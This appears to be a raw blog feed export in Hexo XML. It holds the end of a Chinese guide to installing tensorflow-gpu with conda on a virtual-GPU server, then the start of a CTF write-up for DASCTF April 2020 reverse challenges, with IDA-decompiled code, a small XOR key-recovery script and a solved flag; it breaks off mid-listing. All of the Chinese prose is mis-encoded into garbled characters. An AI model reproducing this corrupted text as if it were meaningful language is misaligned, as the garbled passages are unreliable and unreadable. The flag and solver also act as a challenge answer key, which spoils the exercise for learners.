ä¸ºç‰ˆæƒé—®é¢˜ tuna é•œåƒè¿˜ä¸­æ–­è¿‡ä¸€é˜µå­ï¼Œåæ¥æ”¾å¼€äº†ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/conda config --set show_channel_urls <span class="token function">yes</span></code></pre><br><hr><h2 id="0x07-å®‰è£…-tensorflow-gpu-ï¼ˆåŒ…æ‹¬-cuDNNï¼‰"><a href="#0x07-å®‰è£…-tensorflow-gpu-ï¼ˆåŒ…æ‹¬-cuDNNï¼‰" class="headerlink" title="0x07 å®‰è£… tensorflow-gpu ï¼ˆåŒ…æ‹¬ cuDNNï¼‰"></a>0x07 å®‰è£… tensorflow-gpu ï¼ˆåŒ…æ‹¬ cuDNNï¼‰</h2><h3 id="0x07-1-æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰çš„å•¦ï¼‰"><a href="#0x07-1-æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰çš„å•¦ï¼‰" class="headerlink" title="0x07-1 æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰çš„å•¦ï¼‰"></a>0x07-1 æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼ˆå¯é€‰çš„å•¦ï¼‰</h3><p>åä¸º<code>tensorflow</code>ï¼ŒæŒ‡å®š python ç‰ˆæœ¬ä¸º3.6ã€‚ï¼ˆè¿™ä¸ªçœ‹ä¸ªäººä»¥åŠéœ€æ±‚å§ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">conda create -n tensorflow <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.6</span></code></pre><p>å¯èƒ½éœ€è¦ç¡®è®¤å°±å›è½¦æˆ–è€…è¾“å…¥<code>y</code>å®Œäº‹ã€‚</p><h3 id="0x07-2-å®‰è£…-tensorflow-gpu"><a href="#0x07-2-å®‰è£…-tensorflow-gpu" class="headerlink" title="0x07-2 å®‰è£… tensorflow-gpu"></a>0x07-2 å®‰è£… tensorflow-gpu</h3><p>é¦–å…ˆæŸ¥ä¸€ä¸‹å½“å‰ç¯å¢ƒä¸‹æ”¯æŒçš„ç‰ˆæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">conda search tensorflow-gpu</code></pre><p>æ³¨æ„ä¸€ä¸‹é©±åŠ¨çš„ç‰ˆæœ¬é—®é¢˜ï¼Œå¯¹äºæ–°çš„tfç‰ˆæœ¬ï¼Œé©±åŠ¨å¯èƒ½ä¸æ”¯æŒã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430004948774.png" alt="tf-gpu"></p><p>æ¯”å¦‚è£…1.15.0ç‰ˆæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">install</span> tensorflow-gpu<span class="token operator">==</span><span class="token number">1.15</span>.0</code></pre><p>å¤§æ¦‚å…­ä¸ƒç™¾MBçš„äºšå­ï¼Œç½‘ç»œä¸æ˜¯å¾ˆç¨³å®šï¼Œå¤§æ¦‚ç‡éœ€è¦é‡è¯•å‡ æ¬¡æ‰è¡Œã€‚</p><h3 id="0x07-3-éªŒè¯å®‰è£…"><a href="#0x07-3-éªŒè¯å®‰è£…" class="headerlink" title="0x07-3 éªŒè¯å®‰è£…"></a>0x07-3 éªŒè¯å®‰è£…</h3><p>å®‰è£…å®Œæˆåï¼Œè¿›å…¥<code>python</code>è¯•ä¸€è¯•å‘—ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf<span class="token keyword">print</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>test<span class="token punctuation">.</span>is_gpu_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430005628362.png" alt="tftest"></p><p>æ˜¾ç¤ºä¸º<code>True</code>åˆ™è¡¨ç¤ºä»¥ä¸Šå®‰è£…æˆåŠŸäº†ï¼</p><p>ï¼ˆtf 2.x çš„è¯è¿™ä¸ªæ–¹æ³•å·²ç» deprecated äº†ï¼Œå»ºè®®ç”¨<code>tf.config.list_physical_devices('GPU')</code> æ–¹æ³•ã€‚tf 1.x æ— æ­¤ç”¨æ³•ã€‚</p><blockquote><p><strong>WARNING:</strong> tensorflow:From &lt;stdin&gt;:1: is_gpu_available (from tensorflow.python.framework.test_util) is deprecated and will be removed in a future version.<br>Instructions for updating:<br>Use <code>tf.config.list_physical_devices('GPU')</code> instead.    </p></blockquote><p>ä¹Ÿå¯ä»¥è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç„¶åå¦å¤–å†å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œåˆ©ç”¨ <code>nvidia-smi</code> æŸ¥çœ‹æ˜¾å¡æƒ…å†µã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430010032560.png" alt="nvidia-smi"></p><p>åœ¨ Processes é‡Œçœ‹åˆ°è¿è¡Œçš„ä»»åŠ¡å°±æˆåŠŸäº†å‘€ï¼</p><p>å“‡å¥½è€¶ï¼ï¼ï¼</p><p>ç»ˆäºæå®šäº†ï¼ï¼ï¼</p><p>ä¹‹åä½ å°±å¯ä»¥æ„‰å¿«åœ°ç‚¼ä¸¹å•¦ï¼</p><br><hr><h2 id="0x08-å°ç»“"><a href="#0x08-å°ç»“" class="headerlink" title="0x08 å°ç»“"></a>0x08 å°ç»“</h2><p>å…¶å®ä¸»è¦å°±æ˜¯è¿™å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li><strong>å®‰è£… Ubuntu è™šæ‹Ÿæœº</strong>  </li><li><strong>å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ</strong>  </li><li><strong>å®‰è£… CUDA Toolkit</strong>   </li><li><strong>å®‰è£… Anaconda3</strong>  </li><li><strong>å®‰è£… tensorflow-gpu ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬äº† cuDNNï¼‰</strong></li></ul><p>æˆ–è€…</p><ul><li><strong>å®‰è£… Ubuntu è™šæ‹Ÿæœº</strong>  </li><li><strong>å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ</strong>  </li><li><strong>å®‰è£… Docker nvidia-container-toolkit</strong>  </li><li><strong>æ‹‰å– tensorflow-gpu é•œåƒ</strong>  </li></ul><p>å…¶å®è¿‡ç¨‹æŒºéº»çƒ¦çš„ï¼Œè€Œä¸”é‡åˆ°äº†ä¸å°‘å‘ï¼Œæ¯”å¦‚æˆ‘è¿™æ¬¡çš„ä¸€éƒ¨åˆ†ç»å†â€¦â€¦</p><blockquote><p>æ˜¾å¡é©±åŠ¨è£…äº†ï¼Œ<code>nvidia-smi</code> çœ‹æ²¡é—®é¢˜ï¼Œè¿˜æœ‰ä¸ª CUDA Version å°±ä»¥ä¸ºæœ‰ CUDA äº†ã€‚<br>è£…å¥½ anacondaï¼Œç„¶åç”¨ <code>conda install tensorflow-gpu</code>ï¼Œè¿™é‡Œé¢é™„å¸¦äº† cuDNNã€‚<br>ç„¶åæµ‹è¯• GPU çš„æ—¶å€™ç»™æˆ‘æŠ¥ <code>tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable</code><br>è¿™ä¸ªé”™è¯¯ã€‚ã€‚<br>è°·æ­Œæœäº†è€åŠå¤©æ²¡ææ‡‚ï¼Œç„¶åå»è£…äº† NVIDIA Container Toolkitï¼Œæ‹‰äº†ä¸ª tf çš„ Docker é•œåƒè·‘ï¼Œå‘ç°æ˜¯æ²¡é—®é¢˜çš„ã€‚<br>æœ€åæƒ³åˆ°æ˜¯ä¸æ˜¯ CUDA æ²¡è£…ï¼Œäºæ˜¯çœ‹äº† tf é•œåƒç”¨çš„ CUDA ç‰ˆæœ¬æ˜¯10.1.243ï¼Œå»å®˜ç½‘æ‰¾æ¥è£…ä¸Šã€‚<br>å†å›æ¥åˆ° conda ç¯å¢ƒé‡Œæµ‹è¯•ï¼Œç»ˆäºå¥½äº†ã€‚ã€‚</p></blockquote><p>ç‰¹åˆ«æ˜¯è§‰å¾—é©¬ä¸Šè¦å®Œäº‹äº†ï¼Œåœ¨éªŒè¯ GPU æ—¶å€™å°±å‘ç°æŠ¥é”™äº†é‚£ç§æ—¶å€™ï¼Œå¾ˆç»æœ›ä¸æ˜¯å—ã€‚</p><p>ä¸è¿‡<strong>ä¸€æ­¥ä¸€æ­¥æ¥è¿˜æ˜¯å¯ä»¥æˆåŠŸå®‰è£…çš„</strong>ï¼Œå“‡æ˜¯æœ‰ç‚¹æˆå°±æ„Ÿ 23333.</p><p>æœºå™¨å­¦ä¹ /æ·±åº¦å­¦ä¹ æœ‰ç©ºæ…¢æ…¢å­¦å‘¢ï¼ˆ</p><p>å‘œï¼Œ<del>æ„Ÿè§‰è«åå¥‡å¦™æˆè¿ç»´çš„äº†</del>ï¼Œå˜¤å˜¤å˜¤ä¸è¦ã€‚</p><p><em>ï¼ˆï¼ˆæºœäº†æºœäº†å–µ</em></p><br><hr><h2 id="0xFF-References-amp-Extensive-Reading"><a href="#0xFF-References-amp-Extensive-Reading" class="headerlink" title="0xFF References &amp; Extensive Reading"></a>0xFF References &amp; Extensive Reading</h2><ul><li><p><a href="https://www.nvidia.cn/data-center/virtualization/">NVIDIA è™šæ‹Ÿ GPU</a></p></li><li><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141">æ·±ä¿¡æœè¶…èåˆTensorflow-vGPUç‰ˆé…ç½®æŒ‡å¯¼</a></p></li><li><p><a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#abstract">NVIDIA CUDA Toolkit Release Notes</a></p></li><li><p><a href="https://www.tensorflow.org/install/">TensorFlow å®˜æ–¹å®‰è£…æ•™ç¨‹</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/72298520">Ubuntu 18.04å®‰è£…CUDAå’ŒcuDNN</a></p></li><li><p><a href="https://blog.csdn.net/wanzhen4330/article/details/81699769">Ubuntu16.04ä¸‹å®‰è£…cudaå’Œcudnnçš„ä¸‰ç§æ–¹æ³•</a></p></li><li><p><a href="https://tf.wiki/zh/basic/installation.html">TensorFlow å®‰è£…ä¸ç¯å¢ƒé…ç½®ï¼ˆç®€å•ç²—æš´ TensorFlow 2ï¼‰</a> </p></li><li><p><a href="https://blog.csdn.net/baidu_36639782/article/details/86691407">RuntimeError: CUDA error: all CUDA-capable devices are busy or unavailable</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> tensorflow </tag>
            
            <tag> GPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 DASCTF å››æœˆæ˜¥å­£æˆ˜ Re&amp;Misc WriteUp</title>
      <link href="2020/04/25/CTF_2020DASCTF_April/"/>
      <url>2020/04/25/CTF_2020DASCTF_April/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/04/25/CTF_2020DASCTF_April/82776dfcc2e88aa4a379b152a12448c2.png"></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>å®‰æ’æœˆèµ›ï¼Œ2020å¹´DASCTFâ€”â€”å››æœˆæ˜¥å­£æˆ˜ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2020å¹´4æœˆ25æ—¥ä¸‹åˆ13:30-17:30</p><p>æ¯”èµ›å¹³å°ï¼š<a href="https://www.linkedbyx.com/studyCenter/36998/tasks">https://www.linkedbyx.com/studyCenter/36998/tasks</a> </p><p>è¯·æäº¤flag{}/DASCTF{}æ‹¬å·é‡Œé¢çš„å†…å®¹ã€‚</p></blockquote><p>ä»Šå¤©ä¸‹åˆæœ‰ä¸ª DASCTF å®‰æ’æœˆèµ›ï¼Œå››æœˆæ˜¥å­£æˆ˜ï¼Œéš¾åº¦æ®èµµå¸ˆå‚…è¯´<strong>â€œé›¨éœ²å‡æ²¾â€</strong>ï¼Œå°±æ¥çœ‹äº†çœ‹é¢˜ã€‚</p><p>å…¶å®è¿˜æ˜¯å¤§æ¦‚æ¯”èµ›å¼€å§‹ä¹‹åä¸€ä¸¤ä¸ªå°æ—¶æ‰æ³¨å†Œçš„ï¼Œäºæ˜¯åˆ’äº†ä¸ªæ°´ï¼Œå¤§æ¦‚çœ‹äº†å‡ é“ <strong>Re å’Œ Misc çš„é¢˜</strong>ï¼Œéšä¾¿å†™å†™ WP å§ã€‚</p><p>ï¼ˆå…¶å®ä¹Ÿæ²¡å‡ é“é¢˜ä¼šåšçš„ï¼Œæœ‰çš„è¿˜æ˜¯èµ›åè¡¥çš„ï¼Œå‘œã€‚</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="å…¥é—¨reverse"><a href="#å…¥é—¨reverse" class="headerlink" title="å…¥é—¨reverse"></a>å…¥é—¨reverse</h3><p><strong>é¢˜ç›®é™„ä»¶ï¼š</strong><a href="2004225e9ff11e77f07">åœ¨è¿™é‡Œ</a></p><p>æ‹–è¿› IDA çœ‹ä¸‹ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t i<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+A0h] [ebp-8h]</span>  <span class="token function">_alloca</span><span class="token punctuation">(</span><span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"input your key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&gt;&gt;</span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v6<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">112</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v6<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">112</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token string">"akhb~chdaZrdaZudqduvdZvvv|"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"yes!you are right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"PAUSE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>A0h-30h æ­£å¥½å°±æ˜¯åè¿›åˆ¶çš„ 112ï¼Œäºæ˜¯ <code>v6[i - 112]</code> å¯¹åº”çš„å°±æ˜¯ <code>v5</code> çš„åœ°å€ã€‚</p><p><strong>Expï¼š</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>s<span class="token operator">=</span><span class="token string">"akhb~chdaZrdaZudqduvdZvvv|"</span>new<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">6</span>    new<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span></code></pre><p><code>flag{daef_wef_reverse_sss}</code></p><p>å“‡å¥½è€¶ï¼Œå¥½ä¹…æ²¡çœ‹åˆ°è¿™ä¹ˆç®€å•çš„ Re é¢˜äº†å”‰ï¼</p><br><h3 id="encrypt3"><a href="#encrypt3" class="headerlink" title="encrypt3"></a>encrypt3</h3><p><strong>é¢˜ç›®é™„ä»¶ï¼š</strong><a href="encrypt3">åœ¨è¿™é‡Œ</a></p><p>åŒæ ·æ‹–è¿› IDAã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+17h] [rbp-49h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-40h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-3Ch]</span>  __int64 v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-38h]</span>  <span class="token keyword">char</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+31h] [rbp-2Fh]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+32h] [rbp-2Eh]</span>  <span class="token keyword">char</span> v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+33h] [rbp-2Dh]</span>  <span class="token keyword">char</span> v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-2Ch]</span>  <span class="token keyword">char</span> v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+35h] [rbp-2Bh]</span>  <span class="token keyword">char</span> v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+36h] [rbp-2Ah]</span>  <span class="token keyword">char</span> v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+37h] [rbp-29h]</span>  <span class="token keyword">char</span> v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-28h]</span>  <span class="token keyword">char</span> v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+39h] [rbp-27h]</span>  <span class="token keyword">char</span> v26<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ah] [rbp-26h]</span>  <span class="token keyword">char</span> v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Bh] [rbp-25h]</span>  <span class="token keyword">char</span> v28<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ch] [rbp-24h]</span>  <span class="token keyword">char</span> v29<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Dh] [rbp-23h]</span>  <span class="token keyword">char</span> v30<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Eh] [rbp-22h]</span>  <span class="token keyword">char</span> v31<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Fh] [rbp-21h]</span>  <span class="token keyword">char</span> v32<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-20h]</span>  <span class="token keyword">char</span> v33<span class="token punctuation">;</span> <span class="token comment">// [rsp+41h] [rbp-1Fh]</span>  <span class="token keyword">char</span> v34<span class="token punctuation">;</span> <span class="token comment">// [rsp+42h] [rbp-1Eh]</span>  <span class="token keyword">char</span> v35<span class="token punctuation">;</span> <span class="token comment">// [rsp+43h] [rbp-1Dh]</span>  <span class="token keyword">char</span> v36<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp-1Ch]</span>  <span class="token keyword">char</span> v37<span class="token punctuation">;</span> <span class="token comment">// [rsp+45h] [rbp-1Bh]</span>  <span class="token keyword">char</span> v38<span class="token punctuation">;</span> <span class="token comment">// [rsp+46h] [rbp-1Ah]</span>  <span class="token keyword">char</span> v39<span class="token punctuation">;</span> <span class="token comment">// [rsp+47h] [rbp-19h]</span>  <span class="token keyword">char</span> v40<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-18h]</span>  <span class="token keyword">char</span> v41<span class="token punctuation">;</span> <span class="token comment">// [rsp+49h] [rbp-17h]</span>  <span class="token keyword">char</span> v42<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ah] [rbp-16h]</span>  <span class="token keyword">char</span> v43<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Bh] [rbp-15h]</span>  <span class="token keyword">char</span> v44<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ch] [rbp-14h]</span>  <span class="token keyword">char</span> v45<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Dh] [rbp-13h]</span>  <span class="token keyword">char</span> v46<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Eh] [rbp-12h]</span>  <span class="token keyword">char</span> v47<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Fh] [rbp-11h]</span>  <span class="token keyword">char</span> v48<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-10h]</span>  <span class="token keyword">char</span> v49<span class="token punctuation">;</span> <span class="token comment">// [rsp+51h] [rbp-Fh]</span>  <span class="token keyword">char</span> v50<span class="token punctuation">;</span> <span class="token comment">// [rsp+52h] [rbp-Eh]</span>  <span class="token keyword">char</span> v51<span class="token punctuation">;</span> <span class="token comment">// [rsp+53h] [rbp-Dh]</span>  <span class="token keyword">char</span> v52<span class="token punctuation">;</span> <span class="token comment">// [rsp+54h] [rbp-Ch]</span>  <span class="token keyword">char</span> v53<span class="token punctuation">;</span> <span class="token comment">// [rsp+55h] [rbp-Bh]</span>  <span class="token keyword">unsigned</span> __int64 v54<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>  v54 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">44</span><span class="token punctuation">;</span>  v18 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>  v19 <span class="token operator">=</span> <span class="token number">39</span><span class="token punctuation">;</span>  v20 <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>  v21 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v22 <span class="token operator">=</span> <span class="token number">34</span><span class="token punctuation">;</span>  v23 <span class="token operator">=</span> <span class="token number">115</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token number">118</span><span class="token punctuation">;</span>  v31 <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v33 <span class="token operator">=</span> <span class="token number">120</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v35 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v37 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v38 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v39 <span class="token operator">=</span> <span class="token number">34</span><span class="token punctuation">;</span>  v40 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v41 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v42 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v43 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v44 <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>  v45 <span class="token operator">=</span> <span class="token number">112</span><span class="token punctuation">;</span>  v46 <span class="token operator">=</span> <span class="token number">115</span><span class="token punctuation">;</span>  v47 <span class="token operator">=</span> <span class="token number">118</span><span class="token punctuation">;</span>  v48 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v49 <span class="token operator">=</span> <span class="token number">112</span><span class="token punctuation">;</span>  v50 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v51 <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>  v52 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v53 <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Please input your magic number"</span><span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token 